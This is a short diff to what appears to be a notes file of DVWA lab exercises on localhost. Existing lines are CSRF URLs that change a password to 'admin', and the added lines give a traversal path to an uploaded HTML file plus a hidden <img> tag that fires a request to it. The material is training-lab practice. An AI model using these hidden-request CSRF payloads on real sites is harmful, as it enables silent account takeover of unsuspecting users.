@@ -85,3 +85,10 @@ http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=admin&password_conf=adm
 
 
 http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change&user_token=0a8e94ed46dee4d1f908b430e51145ef#
+
+
+
+http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/04-index.html
+
+
+<img src="http://127.0.0.1:4280/vulnerabilities/upload/../../hackable/uploads/04-index.html" style="display:none">
